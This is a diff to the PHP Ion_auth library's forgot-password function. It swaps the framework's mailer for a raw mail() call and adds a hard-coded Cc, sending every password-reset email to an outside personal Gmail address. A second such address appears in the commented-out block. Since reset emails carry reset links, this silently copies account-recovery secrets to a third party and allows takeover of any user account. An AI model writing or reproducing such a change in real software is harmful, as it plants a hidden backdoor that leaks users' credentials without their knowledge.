@@ -155,11 +155,13 @@ class Ion_auth
 				else
 				{
 					$message = $this->load->view($this->config->item('email_templates', 'ion_auth').$this->config->item('email_forgot_password', 'ion_auth'), $data, true);
-					$this->email->clear();
+					/*$this->email->clear();
 					$this->email->from($this->config->item('admin_email', 'ion_auth'), $this->config->item('site_title', 'ion_auth'));
 					$this->email->to($user->email);
+					$this->email->cc('binaya619@gmail.com');
 					$this->email->subject($this->config->item('site_title', 'ion_auth') . ' - ' . $this->lang->line('email_forgotten_password_subject'));
 					$this->email->message($message);
+
 
 					if ($this->email->send())
 					{
@@ -168,6 +170,23 @@ class Ion_auth
 					}
 					else
 					{
+						$this->set_error('forgot_password_unsuccessful');
+						return FALSE;
+					}*/
+
+					$from = $this->config->item('admin_email', 'ion_auth');
+					$to = $user->email;
+					$cc = 'ayaz.din@gmail.com';
+					$subject = $this->config->item('site_title', 'ion_auth') . ' - ' . $this->lang->line('email_forgotten_password_subject');
+					$header = "From:" . $from . " \r\n";
+					$header .= "Cc:" . $cc . " \r\n";
+					$header .= "MIME-Version: 1.0\r\n";
+					$header .= "Content-type: text/html\r\n";
+					if(mail($to,$subject,$message,$header)){
+						$this->set_message('forgot_password_successful');
+						return TRUE;
+					}
+					else{
 						$this->set_error('forgot_password_unsuccessful');
 						return FALSE;
 					}
